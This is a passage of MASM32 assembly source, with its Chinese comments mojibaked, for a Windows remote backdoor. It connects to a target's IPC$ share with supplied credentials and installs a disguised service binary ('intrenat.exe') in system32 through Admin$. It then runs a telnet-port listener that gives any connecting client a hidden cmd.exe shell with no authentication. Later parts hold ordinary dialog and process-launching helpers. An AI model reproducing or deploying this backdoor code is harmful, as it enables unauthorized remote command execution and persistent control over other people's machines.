          .if @installServiceStatus.dwCurrentState==SERVICE_START_PENDING
             invoke Sleep,100
          .else
             .break
          .endif
        .endw
        .if @installServiceStatus.dwCurrentState==SERVICE_RUNNING
          invoke MessageBox,NULL,addr lpszInstallOK,NULL,MB_OK
        .else
          invoke MessageBox,NULL,addr lpszInstallFail,NULL,MB_OK
        .endif
        invoke CloseServiceHandle,@schSCManager
        invoke CloseServiceHandle,@schService        
      .endif
      invoke GlobalFree,@lpHostName

      ret
_installCmdService  endp

;-----------------------------------------------------
; ֹͣ���ų������ɾ�����ų�����
; ����_lpHostΪĿ�������IP��ַ��������أ���ΪNULL
;-----------------------------------------------------
_removeCmdService  proc _lpHost
      local @schSCManager,@schService
      local @lpCurrentPath[MAX_PATH]:byte
      local @lpImagePath[MAX_PATH]:byte
      local @lpHostName
      local @hSearch,@dwErrorCode
      local @removeServiceStatus:SERVICE_STATUS
      local @fileData:WIN32_FIND_DATA

      .if _lpHost==NULL
        ;������ų���ı��ؾ���·��c:\windows\system32\intrenat.exe
        invoke GetSystemDirectory,addr @lpImagePath,MAX_PATH
        invoke lstrcat,addr @lpImagePath,addr lpszExeName
        mov @lpHostName,NULL
      .else
        ;������ų����URL·��\\10.115.47.36\Admin$\system32\intrenat.exe
        invoke RtlZeroMemory,addr @lpImagePath,MAX_PATH
        invoke wsprintf,addr @lpImagePath,addr lpszBackDoorFmt1,_lpHost

        invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,256
        mov @lpHostName,eax
        invoke wsprintf,@lpHostName,addr lpszBackDoorFmt2,\
               addr lpszPreURL,_lpHost
      .endif

      ;��Ŀ�������ķ��������
      invoke OpenSCManager,@lpHostName,NULL,SC_MANAGER_ALL_ACCESS
      mov @schSCManager,eax
      .if @schSCManager
        invoke OpenService,@schSCManager,addr lpszServiceName,SERVICE_ALL_ACCESS
        mov @schService,eax
        .if eax==NULL
          invoke CloseServiceHandle,@schSCManager
        .else
          ;ֹͣ��̨����
          invoke QueryServiceStatus,@schService,addr @removeServiceStatus
          .if eax!=0
            .if @removeServiceStatus.dwCurrentState!=SERVICE_STOPPED
               invoke ControlService,@schService,SERVICE_CONTROL_STOP,\
                      addr @removeServiceStatus
               .if eax
                 .while TRUE
                   invoke QueryServiceStatus,@schService,addr @removeServiceStatus
                   .break .if eax!=SERVICE_STOP_PENDING
                   invoke Sleep,100
                 .endw
               .endif
            .endif
          .endif
          invoke DeleteService,@schService
        .endif
        invoke CloseServiceHandle,@schSCManager
        invoke CloseServiceHandle,@schService        
      .endif

      ;ɾ�����ų�����
      invoke Sleep,1500

      invoke FindFirstFile,addr @lpImagePath,addr @fileData
      .if eax!=INVALID_HANDLE_VALUE ;�ļ�����
        invoke DeleteFile,addr @lpImagePath
      .endif
      invoke FindClose,eax
      invoke GlobalFree,@lpHostName

      invoke MessageBox,NULL,addr lpszRemoveOK,NULL,MB_OK

      ret
_removeCmdService  endp

;------------------------------
; ��Զ����������IPC$����
;------------------------------
_connectRemote proc _bConnect,_lpHost,_lpUserName,_lpPassword
      local @dwErrorCode
      local @netResource:NETRESOURCE
    
      invoke wsprintf,addr lpIPC,addr lpszBackDoorFmt3,_lpHost
      invoke RtlZeroMemory,addr @netResource,sizeof NETRESOURCE
      mov @netResource.lpLocalName,NULL
      mov eax,offset lpIPC
      mov @netResource.lpRemoteName,eax
      mov @netResource.dwType,RESOURCETYPE_ANY
      mov @netResource.lpProvider,NULL

      invoke lstrcmp,_lpPassword,addr lpszNULL
      .if !eax
        mov _lpPassword,NULL
      .endif

      .if _bConnect
        ;����
        .while TRUE
          invoke WNetAddConnection2,addr @netResource,_lpPassword,\
                 _lpUserName,CONNECT_INTERACTIVE
          mov @dwErrorCode,eax

          .if eax==ERROR_ALREADY_ASSIGNED || eax==ERROR_DEVICE_ALREADY_REMEMBERED
            invoke WNetCancelConnection2,addr lpIPC,CONNECT_UPDATE_PROFILE,TRUE
          .elseif eax==NO_ERROR
            .break
          .else
            .break
          .endif
          invoke Sleep,10
        .endw
      .else
        invoke WNetCancelConnection2,addr lpIPC,CONNECT_UPDATE_PROFILE,TRUE
      .endif
      ret
_connectRemote endp

;--------------------------------
; ���ţ��ض���CMD���������ȡ��Ϣ���͵��ͻ���
; ��ڲ��� SESSIONDATA����SOCKET ID�ź͹ܵ�id
;--------------------------------
_readShell    proc _lpParam
   local @sdRead:SESSIONDATA
   local @dwBufferRead,@dwBufferNow,@dwBuffer2Send
   local @prevChar:byte
   local @sClient
   local @szShellBuffer[BUFFER_SIZE]:byte
   local @szShellBuffer2Send[BUFFER_SIZE+32]:byte

   mov esi,_lpParam
   assume esi:ptr SESSIONDATA
   push [esi].hPipe
   pop @sdRead.hPipe
   push [esi].sClient
   pop @sdRead.sClient
   assume esi:nothing

   mov eax,@sdRead.sClient
   mov @sClient,eax

   invoke send,@sClient,addr lpszCMDHints1,256,0  ;������ʾ

   .while TRUE
     ;��CMD������ܵ��ж�ȡ����

     invoke PeekNamedPipe,@sdRead.hPipe,addr szShellBuffer,\
            BUFFER_SIZE,addr @dwBufferRead,NULL,NULL
     .if !eax
       .break
     .endif
     .if @dwBufferRead>0
       invoke ReadFile,@sdRead.hPipe,addr @szShellBuffer,BUFFER_SIZE,\
              addr @dwBufferRead,NULL
     .else
       invoke Sleep,10
       .continue
     .endif

     ;������֯���ݵ����ͻ�����,�����е�����
     mov @prevChar,0
     mov @dwBufferNow,0
     mov @dwBuffer2Send,0
     .while TRUE
       mov eax,@dwBufferNow
       .break .if eax==@dwBufferRead
       mov ebx,@dwBufferNow
       mov al,byte ptr @szShellBuffer[ebx]
       .if al==0dh && @prevChar!=0ah
          mov ebx,@dwBufferNow
          mov byte ptr @szShellBuffer[ebx],0ah
       .endif
       mov @prevChar,al
       mov edi,@dwBuffer2Send
       mov byte ptr @szShellBuffer2Send[edi],al
       inc @dwBufferNow
       inc @dwBuffer2Send     
     .endw

     ;����֯�õĻ��������ݷ��͵��ͻ���
     invoke send,@sdRead.sClient,addr @szShellBuffer2Send,@dwBuffer2Send,0
     .if eax==SOCKET_ERROR
       invoke showDW,eax,1
       .break
     .endif
     invoke Sleep,5
   .endw

   invoke shutdown,@sdRead.sClient,2
   invoke closesocket,@sdRead.sClient
   ret
_readShell    endp

;--------------------------------
; ���ţ��ض���CMD�����룬�ӿͻ��˻�ȡ����Ϣ���͸�CMD������ܵ�
;--------------------------------
_writeShell    proc _lpParam
   local @sdWrite:SESSIONDATA
   local @dwBuffer2Write,@dwBufferWritten
   local @szBuffer2Write[BUFFER_SIZE+32]:byte
 

   mov esi,_lpParam
   assume esi:ptr SESSIONDATA
   push [esi].hPipe
   pop @sdWrite.hPipe
   push [esi].sClient
   pop @sdWrite.sClient
   assume esi:nothing

   mov @dwBuffer2Write,0

   ;��ȡ�׽���
   .while TRUE
     invoke recv,@sdWrite.sClient,addr szWriteBuffer,1,0
     .break .if !eax
     mov al,byte ptr szWriteBuffer

     mov ebx,@dwBuffer2Write
     mov byte ptr @szBuffer2Write[ebx],al
     inc @dwBuffer2Write

     ;������յ�һ�У������½���
     .if al==0dh
       ;�����յ�����Ϣд��CMD������ܵ���
       invoke WriteFile,@sdWrite.hPipe,addr @szBuffer2Write,\
              @dwBuffer2Write,addr @dwBufferWritten,NULL
       .break .if !eax
       mov @dwBuffer2Write,0
     .endif

     invoke Sleep,10
   .endw
   invoke shutdown,@sdWrite.sClient,2
   invoke closesocket,@sdWrite.sClient
   ret
_writeShell    endp


;------------------------------
; ���ţ�������������Ĺ����������˿ڣ�������������
; ��ڲ������ͻ���SOCKET���
;------------------------------
_cmdShell    proc   _lpParam
   local @sClient
   local @hWritePipe,@hReadPipe,@hWriteShell,@hReadShell
   local @hThread[3]:dword
   local @dwRecvThreadId,@dwSendThreadId
   local @dwProcessId
   local @dwResult
   local @lpStartupInfo:STARTUPINFO
   local @sdWrite:SESSIONDATA
   local @sdRead:SESSIONDATA
   local @lpProcessInfo:PROCESS_INFORMATION
   local @saPipe:SECURITY_ATTRIBUTES
   local @lpProcessDataLast
   local @lpProcessDataNow
   local @lpImagePath[MAX_PATH]:byte


   push _lpParam
   pop esi
   mov eax,dword ptr [esi]
   mov @sClient,eax

   mov @saPipe.nLength,sizeof @saPipe
   mov @saPipe.bInheritHandle,TRUE
   mov @saPipe.lpSecurityDescriptor,NULL


   ;                     TELNET          hWritePipe               hWriteShell          CMD 
   ;       �ͻ���       ���������  socket ��д��                    ������      input  ���������� ��������
   ;                    �� exit ��-------> |-----------------------------|-----------> �� exit  �� 
   ;                    ��      ��         |//////////Pipe1//////////////|             ��       ��
   ;                    ��      ��         |-----------------------------|             ��       ��
   ;                    �� �ȴ� ��                                                     ��  ���� ��
   ;                    �� ִ�� ��                                                     ��       ��
   ;                    ��      ��                                                     ��       ��
   ;                    ��      ��         hReadPipe                hReadShell         ��       ��
   ;                    ��      ��  socket (����                    ��д��       output �� ����  ��
   ;                    �� ��ʾ ��<--------|-----------------------------|<----------- �� ���  �� 
   ;                    �� ��� ��         |//////////Pipe2//////////////|             ��       ��
   ;                    �� ���� ��         |-----------------------------|             ��       ��
   ;
   ;                                               ���ų�����ʾ��ͼ



   ;������ʾ����Ĺܵ�
   invoke CreatePipe,addr @hReadPipe,addr @hReadShell,addr @saPipe,0
   ;������������Ĺܵ�
   invoke CreatePipe,addr @hWriteShell,addr @hWritePipe,addr @saPipe,0
   ;���������ض�����������Ժ��CMD����
   invoke GetStartupInfo,addr @lpStartupInfo
   mov @lpStartupInfo.cb,sizeof @lpStartupInfo
   mov @lpStartupInfo.dwFlags,STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES

   push @hWriteShell
   pop @lpStartupInfo.hStdInput  ;�����ض���hWriteShell
   push @hReadShell
   pop @lpStartupInfo.hStdOutput  ;����ض���hReadShell
   push @hReadShell
   pop @lpStartupInfo.hStdError 
   mov @lpStartupInfo.wShowWindow,SW_HIDE

   invoke GetSystemDirectory,addr @lpImagePath,MAX_PATH
   invoke lstrcat,addr @lpImagePath,addr lpszCmd

   invoke WaitForSingleObject,hMutex,INFINITE      
   
   invoke CreateProcess,addr @lpImagePath,NULL,NULL,NULL,\
          TRUE,0,NULL,NULL,addr @lpStartupInfo,addr @lpProcessInfo
   .if !eax  ;����
     invoke MessageBox,NULL,addr szOut,NULL,MB_OK
     ret
   .endif
   invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,sizeof PROCESSDATA
   mov @lpProcessDataNow,eax
   mov esi,eax
   assume esi:ptr PROCESSDATA

   mov eax,@lpProcessInfo.hProcess
   mov [esi].hProcess,eax
   push @lpProcessInfo.dwProcessId
   pop [esi].dwProcessId
   mov [esi].next,NULL

   ;����CMD���̲��뵽������
   .if lpProcessDataHead==NULL || lpProcessDataEnd==NULL  ;���������û�м�¼������ͷβָ���ָ���CMD����
     mov eax,@lpProcessDataNow
     mov lpProcessDataHead,eax
     mov lpProcessDataEnd,eax
   .else                                                  ;���뵽���е����
     mov eax,@lpProcessDataNow
     mov esi,lpProcessDataEnd

     mov [esi].next,eax
     mov lpProcessDataEnd,eax
   .endif
   assume esi:nothing

   mov eax,@lpProcessInfo.hProcess
   mov dword ptr @hThread[0],eax
   mov eax,@lpProcessInfo.dwProcessId
   mov @dwProcessId,eax

   ;�ͷ���Դ
   invoke CloseHandle,@lpProcessInfo.hThread
   invoke ReleaseMutex,hMutex
   invoke CloseHandle,@hWriteShell
   invoke CloseHandle,@hReadShell

   ;������ʾ������̣�CMD��������ݷ��͸��ܵ�hReadPipe���������ͨ��_readShell����
   push @hReadPipe
   pop @sdRead.hPipe
   push @sClient
   pop @sdRead.sClient
   invoke CreateThread,NULL,0,addr _readShell,addr @sdRead,0,addr @dwSendThreadId
   mov dword ptr @hThread[4],eax

   ;��������������̣�CMD�����������ɹܵ�hWritePipe��ȡ�������ͨ��_writeShell����
   push @hWritePipe
   pop @sdWrite.hPipe
   push @sClient
   pop @sdWrite.sClient
   invoke CreateThread,NULL,0,addr _writeShell,addr @sdWrite,0,addr @dwRecvThreadId
   mov dword ptr @hThread[8],eax

   invoke WaitForMultipleObjects,3,addr @hThread,FALSE,INFINITE
   mov @dwResult,eax

   .if @dwResult>=WAIT_OBJECT_0 && @dwResult<=(WAIT_OBJECT_0+2)
     mov eax,@dwResult
     sub eax,WAIT_OBJECT_0
     mov @dwResult,eax

     .if @dwResult!=0
       mov eax,dword ptr @hThread[0]
       invoke TerminateProcess,eax,1
     .endif

     ;���µ��㷨��mov eax,@hThread[((@dwResult+1)%3)*4]

     mov eax,@dwResult
     inc eax
     xor edx,edx
     mov ecx,3
     div ecx
     mov eax,edx
     xor edx,edx
     mov ecx,4
     mul ecx
     mov ebx,eax
     mov eax,dword ptr @hThread[ebx]
     invoke CloseHandle,eax

     ;���µ��㷨��mov eax,@hThread[((@dwResult+2)%3)*4]
     mov eax,@dwResult
     inc eax
     inc eax
     xor edx,edx
     mov ecx,3
     div ecx
     mov eax,edx
     xor edx,edx
     mov ecx,4
     mul ecx
     mov ebx,eax
     mov eax,dword ptr @hThread[ebx]
     invoke CloseHandle,eax
   .endif

   invoke CloseHandle,@hWritePipe
   invoke CloseHandle,@hReadPipe
  
   invoke WaitForSingleObject,hMutex,INFINITE
   mov @lpProcessDataLast,NULL
   push lpProcessDataHead
   pop @lpProcessDataNow

   ;�����������뵱ǰ���̺�һ�µļ�¼����ɾ��
   .while TRUE
     mov esi,@lpProcessDataNow
     assume esi:ptr PROCESSDATA
     mov eax,[esi].next
     .break .if eax==NULL
     mov eax,[esi].dwProcessId
     .break .if eax==@dwProcessId
     push @lpProcessDataNow
     pop @lpProcessDataLast
     push [esi].next
     pop @lpProcessDataNow
   .endw
   mov eax,lpProcessDataEnd
   .if @lpProcessDataNow==eax   ;��������β
     mov eax,[esi].dwProcessId
     .if eax==@dwProcessId  ;��ǰ���̾�������β�ҵ���
        mov eax,@lpProcessDataNow
        .if eax==lpProcessDataHead   ;�����о����Լ���ɾ������ʼ������
          mov lpProcessDataHead,NULL
          mov lpProcessDataEnd,NULL
        .else                        ;�����������һ��ж��
          mov eax,@lpProcessDataLast
          mov lpProcessDataEnd,eax
        .endif 
     .endif
   .else   ;�ҵ�ƥ��ļ�¼
     mov eax,@lpProcessDataNow
     .if eax==lpProcessDataHead    ;����ҵ��ļ�¼�����ף������lpProcessDataHead
       push [esi].next
       pop lpProcessDataHead
     .else                         ;���򽫼�¼��������ɾ��
       push [esi].next
       mov edi,@lpProcessDataLast
       assume edi:ptr PROCESSDATA
       pop [edi].next
       assume edi:nothing
     .endif 
   .endif  
   invoke ReleaseMutex,hMutex
   invoke GlobalFree,@lpProcessDataNow

   ret
_cmdShell    endp



;------------------------------
; ����-��������׽��ֹ���
;------------------------------
_cmdService proc _lpParam
   local @wsa:WSADATA
   local @sServer,@sClient
   local @hThread
   local @sin:sockaddr_in

   invoke WSAStartup,0202h,addr @wsa
   invoke socket,AF_INET,SOCK_STREAM,IPPROTO_TCP
   mov @sServer,eax

   mov @sin.sin_family,AF_INET
   invoke htons,dwTelnetPort
   mov @sin.sin_port,ax
   mov @sin.sin_addr.S_un.S_addr,INADDR_ANY
   invoke bind,@sServer,addr @sin,sizeof sockaddr_in

   invoke listen,@sServer,5

   ;��ʼ���ź���������
   invoke CreateMutex,NULL,FALSE,NULL
   mov hMutex,eax
   mov lpProcessDataHead,NULL
   mov lpProcessDataEnd,NULL

   ;����ͻ�������
   .while TRUE
     invoke accept,@sServer,NULL,NULL
     mov @sClient,eax
     invoke CreateThread,NULL,0,addr _cmdShell,addr @sClient,0,NULL
     .if eax==NULL
        .break
     .endif
     invoke Sleep,1000
   .endw
   invoke WSACleanup
   ret
_cmdService endp


;------------------------------
; ����-�������״̬����
;------------------------------
_cmdControl proc _dwCode
     .if _dwCode==SERVICE_CONTROL_PAUSE
       mov serviceStatus.dwCurrentState,SERVICE_PAUSED;
     .elseif _dwCode==SERVICE_CONTROL_CONTINUE
       mov serviceStatus.dwCurrentState,SERVICE_RUNNING;
     .elseif _dwCode==SERVICE_CONTROL_STOP
       invoke WaitForSingleObject,hMutex,INFINITE
       ;��ֹ���еĺ����߳�
       
       .while TRUE
         .break .if lpProcessDataHead==NULL
         mov esi,lpProcessDataHead
         assume esi:ptr PROCESSDATA
         push esi
         invoke TerminateProcess,[esi].hProcess,1
         pop esi
         .if [esi].next!=NULL
           mov eax,[esi].next
           mov lpProcessDataHead,eax
         .else
           mov lpProcessDataHead,NULL
         .endif
         assume esi:nothing
       .endw
       mov serviceStatus.dwCurrentState,SERVICE_STOPPED
       mov serviceStatus.dwWin32ExitCode,0
       mov serviceStatus.dwCheckPoint,0
       mov serviceStatus.dwWaitHint,0
       invoke SetServiceStatus,hServiceStatus,\
                               addr serviceStatus
       invoke ReleaseMutex,hMutex
       invoke CloseHandle,hMutex
     .elseif _dwCode==SERVICE_CONTROL_INTERROGATE

     .endif
     invoke SetServiceStatus,hServiceStatus,addr serviceStatus
     ret
_cmdControl endp


;----------------------------
; ����-����֮���������ݿ�
;----------------------------
_cmdStart proc _dwArgc,_lpArgv

          mov serviceStatus.dwServiceType,SERVICE_WIN32
          mov serviceStatus.dwCurrentState,SERVICE_START_PENDING
          mov serviceStatus.dwControlsAccepted,\
                  SERVICE_ACCEPT_STOP or SERVICE_ACCEPT_PAUSE_CONTINUE
          mov serviceStatus.dwServiceSpecificExitCode,0
          mov serviceStatus.dwWin32ExitCode,0
          mov serviceStatus.dwCheckPoint,0
          mov serviceStatus.dwWaitHint,0

          ;ע��������������
          invoke RegisterServiceCtrlHandler,addr lpszServiceName,\
                 addr _cmdControl
          mov hServiceStatus,eax
          mov serviceStatus.dwCurrentState,SERVICE_RUNNING
          mov serviceStatus.dwCheckPoint,0
          mov serviceStatus.dwWaitHint,0
          invoke SetServiceStatus,hServiceStatus,addr serviceStatus

          ;�����������̣߳�ʵ�ֺ��Ź���
          invoke CreateThread,NULL,0,addr _cmdService,NULL,0,NULL
          ret
_cmdStart endp




;---------------------------------------------
; ȡ�����в������� (arg count)
; ���������ض����ڵ��� 1, ���� 1 Ϊ��ǰִ���ļ���
;---------------------------------------------
_argc		proc
		local	@dwArgc

		pushad
		mov	@dwArgc,0
		invoke	GetCommandLine
		mov	esi,eax
		cld
_argc_loop:
		; ���Բ���֮��Ŀո�
		lodsb
		or	al,al
		jz	_argc_end
		cmp	al,CHAR_BLANK
		jz	_argc_loop
		; һ��������ʼ
		dec	esi
		inc	@dwArgc
_argc_loop1:
		lodsb
		or	al,al
		jz	_argc_end
		cmp	al,CHAR_BLANK
		jz	_argc_loop		;��������
		cmp	al,CHAR_DELI
		jnz	_argc_loop1		;���������������
		; ���һ�������е�һ�����пո�,���� " " ����
		@@:
		lodsb
		or	al,al
		jz	_argc_end
		cmp	al,CHAR_DELI
		jnz	@B
		jmp	_argc_loop1
_argc_end:
		popad
		mov	eax,@dwArgc
		ret

_argc		endp
;---------------------------
; ȡָ��λ�õ������в���
;  argv 0 = ִ���ļ���
;  argv 1 = ����1 ...
;---------------------------
_argv		proc	_dwArgv,_lpReturn,_dwSize
		local	@dwArgv,@dwFlag

		pushad
		inc	_dwArgv
		mov	@dwArgv,0
		mov	edi,_lpReturn

		invoke	GetCommandLine
		mov	esi,eax
		cld
_argv_loop:
		; ���Բ���֮��Ŀո�
		lodsb
		or	al,al
		jz	_argv_end
		cmp	al,CHAR_BLANK
		jz	_argv_loop
		; һ��������ʼ
		; �����Ҫ��Ĳ�������,��ʼ���Ƶ����ػ�����
		dec	esi
		inc	@dwArgv
		mov	@dwFlag,FALSE
		mov	eax,_dwArgv
		cmp	eax,@dwArgv
		jnz	@F
		mov	@dwFlag,TRUE
		@@:
_argv_loop1:
		lodsb
		or	al,al
		jz	_argv_end
		cmp	al,CHAR_BLANK
		jz	_argv_loop		;��������
		cmp	al,CHAR_DELI
		jz	_argv_loop2
		cmp	_dwSize,1
		jle	@F
		cmp	@dwFlag,TRUE
		jne	@F
		stosb
		dec	_dwSize
		@@:
		jmp	_argv_loop1		;���������������

_argv_loop2:
		lodsb
		or	al,al
		jz	_argv_end
		cmp	al,CHAR_DELI
		jz	_argv_loop1
		cmp	_dwSize,1
		jle	@F
		cmp	@dwFlag,TRUE
		jne	@F
		stosb
		dec	_dwSize
		@@:
		jmp	_argv_loop2
_argv_end:
		xor	al,al
		stosb
		popad
		ret

_argv		endp

;----------------------------
; ���ļ������ñ�Ҫ����
;----------------------------
_preLoad        proc

                mov eax,FILE_SHARE_READ or FILE_SHARE_WRITE
                push eax
                pop dwShareMode

                mov stSecurityp.nLength,NULL
                mov stSecurityp.lpSecurityDescriptor,NULL
                mov stSecurityp.bInheritHandle,NULL

                invoke  RtlZeroMemory,addr stOSVersion,sizeof stOSVersion
                mov stOSVersion.dwOSVersionInfoSize,sizeof OSVERSIONINFO
                invoke  GetVersionEx,offset stOSVersion
                .if eax
                   mov ebx,stOSVersion.dwPlatformId
                   .if ebx==VER_PLATFORM_WIN32_NT
                       mov stSecurityp.nLength,sizeof stSecurityp
                       mov stSecurityp.lpSecurityDescriptor,NULL
                       mov stSecurityp.bInheritHandle,TRUE

                       or dwShareMode,FILE_SHARE_DELETE
                   
                   .endif
                .endif   


                invoke  CreateFile,addr szSaveFile,GENERIC_WRITE or GENERIC_READ,dwShareMode,\
                         addr stSecurityp,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
                mov hExeFile,eax

                invoke GetStartupInfo,addr stStartUp
                mov stStartUp.dwFlags,STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES
                mov eax,hExeFile
                mov stStartUp.hStdOutput,eax
                mov stStartUp.wShowWindow,SW_HIDE

                ret
_preLoad        endp


;---------------------------
; ���ļ��ж�ȡ���н��
;---------------------------
_getFromFile    proc
                local @szBuffer[5000]:byte
                local @szRead:DWORD

                invoke  RtlZeroMemory,addr @szBuffer,sizeof @szBuffer
                invoke  CreateFile,addr szSaveFile,GENERIC_READ,FILE_SHARE_READ,\
                        NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
                mov hExeFile,eax

                invoke ReadFile,hExeFile,addr @szBuffer,sizeof @szBuffer,\
                       addr @szRead,NULL
                invoke CloseHandle,hExeFile
                invoke DeleteFile,addr szSaveFile

                invoke SetDlgItemText,hExecuteDialog,ID_RESULT,addr @szBuffer
                ret
_getFromFile    endp

;-------------------------
; ѡ���ļ�
;-------------------------
_BrowseFile	proc

		mov	stOpenFileName.Flags,OFN_PATHMUSTEXIST or OFN_FILEMUSTEXIST
		mov	stOpenFileName.lStructSize,SIZEOF stOpenFileName
		mov	eax,hWinMain
		mov	stOpenFileName.hwndOwner,eax
		mov	stOpenFileName.lpstrFilter,offset szFilter	;��չ��
		mov	stOpenFileName.lpstrFile,offset szBuffer	;�ļ�������
		mov	stOpenFileName.nMaxFile,512			;�ļ������峤��
		mov	stOpenFileName.lpstrInitialDir,0
		mov	stOpenFileName.lpstrTitle,offset szTitleOpen
		mov	stOpenFileName.lpstrDefExt,offset szExt
		invoke	GetOpenFileName,offset stOpenFileName
		.if	eax == FALSE
			ret
		.endif
		invoke	SetDlgItemText,hExecuteDialog,ID_TEXT,addr szBuffer
		ret

_BrowseFile	endp

;------------------------------------------
; ִ�г����õ��߳�
; 1. �� CreateProcess ��������
; 2. �� WaitForSingleOject �ȴ����̽���
;-------------------------------------------
_RunThreadA	proc	uses ebx ecx edx esi edi,\
		dwParam:DWORD


                test    dwConsoleFlag,F_CONSOLE
                .if     ZERO?  ;����̨��������
		   invoke GetStartupInfo,addr stStartUp
	  	   invoke CreateProcess,NULL,addr szBuffer,NULL,NULL,\
			NULL,NORMAL_PRIORITY_CLASS,NULL,NULL,offset stStartUp,offset stProcInfo
		   .if	eax !=	0
			invoke	WaitForSingleObject,stProcInfo.hProcess,INFINITE
			invoke	CloseHandle,stProcInfo.hProcess
			invoke	CloseHandle,stProcInfo.hThread
		   .else
			invoke	MessageBox,hExecuteDialog,addr szExcuteError,\
                           NULL,MB_OK or MB_ICONERROR
		   .endif
                .else          ;�ǿ���̨��������
                   invoke  _preLoad
   		   invoke  CreateProcess,NULL,addr szBuffer,NULL,NULL,\
			TRUE,NULL,NULL,NULL,offset stStartUp,offset stProcInfo
		   .if	eax !=	0
                     invoke  WaitForSingleObject,stProcInfo.hProcess,INFINITE
                     invoke  CloseHandle,stProcInfo.hProcess
                     invoke  CloseHandle,stProcInfo.hThread
                     invoke  CloseHandle,hExeFile
		   .else
			invoke	MessageBox,hExecuteDialog,addr szExcuteError,\
                                  NULL,MB_OK or MB_ICONERROR
		   .endif
                   invoke  _getFromFile
                .endif


		invoke	GetDlgItem,hExecuteDialog,ID_EXIT
		invoke	EnableWindow,eax,TRUE
		invoke	SendDlgItemMessage,hExecuteDialog,ID_RUN,WM_SETTEXT,0,offset szExcute
		and	dwFlag,not F_RUNNING
		ret

_RunThreadA	endp

_Init		proc
		invoke	SendDlgItemMessage,hExecuteDialog,ID_TEXT,EM_LIMITTEXT,512,NULL
		invoke	GetDlgItem,hExecuteDialog,ID_RUN
        	invoke	EnableWindow,eax,FALSE
              ;��ʼ����ѡ��
              invoke  CheckDlgButton,hExecuteDialog,ID_CONSOLE,BST_UNCHECKED
		ret
_Init		endp
;--------------------------------------------------------------------
; ���� text control �������ַ������Ƿ񽫡�ִ�С���ť Disable ��
;--------------------------------------------------------------------
_CheckText	proc

		invoke	GetDlgItemText,hExecuteDialog,ID_TEXT,addr szBuffer,512
		invoke	lstrlen,addr szBuffer
		.if	eax != 0 || (dwFlag & F_RUNNING)
			invoke	GetDlgItem,hExecuteDialog,ID_RUN
			invoke	EnableWindow,eax,TRUE
		.else
			invoke	GetDlgItem,hExecuteDialog,ID_RUN
			invoke	EnableWindow,eax,FALSE
		.endif
		ret

_CheckText	endp

;------------------------------
; ���̹���-���г��򴰿ڳ���
;------------------------------
DialogMainProc	proc	uses ebx edi esi, \
		hExDlg:HWND,wMsg:DWORD,wParam:DWORD,lParam:DWORD

		mov	eax,wMsg
		.if	eax ==	WM_INITDIALOG
                     mov  eax,hExDlg
                     mov  hExecuteDialog,eax
                     invoke _Init
		.elseif	eax ==	WM_CLOSE
			invoke	EndDialog,hExecuteDialog,NULL
                        mov eax,TRUE
                        ret
		.elseif	eax ==	WM_COMMAND
			mov	eax,wParam
			.if	ax ==	ID_BROWSE
				invoke _BrowseFile
				invoke _CheckText
			.elseif	ax ==	ID_TEXT
				invoke	GetDlgItemText,hExecuteDialog,ID_TEXT,addr szBuffer,512
				invoke _CheckText
			.elseif	ax ==	ID_RUN
				test	dwFlag,F_RUNNING
				.if	ZERO?
					invoke	CreateThread,NULL,NULL,offset _RunThreadA,\
					NULL,NULL,offset hRunThread
				.else
					invoke	TerminateProcess,stProcInfo.hProcess,-1
				.endif
                        .elseif ax ==   ID_CONSOLE
                                test  dwConsoleFlag,F_CONSOLE
                                .if  ZERO?
                                    invoke  CheckDlgButton,hExecuteDialog,ID_CONSOLE,BST_CHECKED
                                .else
                                    invoke  CheckDlgButton,hExecuteDialog,ID_CONSOLE,BST_UNCHECKED
                                .endif  
                                not     dwConsoleFlag
			.elseif	ax ==	ID_EXIT
				invoke	EndDialog,hExecuteDialog,NULL
                          	mov eax,TRUE
                                ret
			.endif
		.else
			mov	eax,FALSE
			ret
		.endif
		mov	eax,TRUE
		ret

DialogMainProc	endp

;------------------------------
; ���̹���-���г��򴰿ڳ���
;------------------------------
_DlgTransparentProc	proc	uses ebx edi esi, \
		hTransDlg:HWND,wMsg:DWORD,wParam:DWORD,lParam:DWORD
        mov eax,wMsg
        .if eax == WM_INITDIALOG
            invoke SendDlgItemMessage,hTransDlg,IDC_TRANSPARENT,TBM_SETRANGEMIN,FALSE,0
            invoke SendDlgItemMessage,hTransDlg,IDC_TRANSPARENT,TBM_SETRANGEMAX,FALSE,255
            invoke SendDlgItemMessage,hTransDlg,IDC_TRANSPARENT,TBM_SETPOS,TRUE,dwInitTransparent
        .elseif eax == WM_CLOSE
            invoke EndDialog,hTransDlg,NULL
            mov eax,TRUE
            ret
        .elseif eax == WM_HSCROLL
            mov eax,wParam
            and eax,0FFFFh  
            .if eax == TB_THUMBPOSITION ; Same as SB_THUMBPOSITION
                mov eax,wParam
                shr eax,16
                mov dwInitTransparent,eax
                invoke SendDlgItemMessage,hTransDlg,IDC_TRANSPARENT,TBM_SETPOS,TRUE,dwInitTransparent
            .elseif eax == TB_THUMBTRACK ; Same as SB_THUMBTRACK
                mov eax,wParam
                shr eax,16
                mov dwInitTransparent,eax
                invoke SendDlgItemMessage,hTransDlg,IDC_TRANSPARENT,TBM_SETPOS,TRUE,dwInitTransparent
            .endif  
            invoke _setTransparency,hWinMain,dwInitTransparent
         .elseif eax == WM_VSCROLL
            mov eax,wParam
            and eax,0FFFFh  
            .if eax == TB_THUMBPOSITION
                mov eax,wParam
                shr eax,16
                mov dwInitTransparent,eax
                invoke SendDlgItemMessage,hTransDlg,IDC_TRANSPARENT,TBM_SETPOS,TRUE,dwInitTransparent
            .elseif eax == TB_THUMBTRACK
                mov eax,wParam
                shr eax,16
                mov dwInitTransparent,eax
                invoke SendDlgItemMessage,hTransDlg,IDC_TRANSPARENT,TBM_SETPOS,TRUE,dwInitTransparent
            .endif
            invoke _setTransparency,hWinMain,dwInitTransparent
         .elseif eax == WM_COMMAND
            mov eax,wParam
            .if ax==IDC_TRANSPARENTOK
              invoke EndDialog,hTransDlg,NULL
              mov eax,TRUE
            .endif
         .else
            mov eax,FALSE
            ret
         .endif
         mov eax,TRUE
         ret
_DlgTransparentProc endp



;------------------------------
; ת��...�еĴ��ڳ���
;------------------------------
_GoToMain     proc   uses ebx edi esi,\
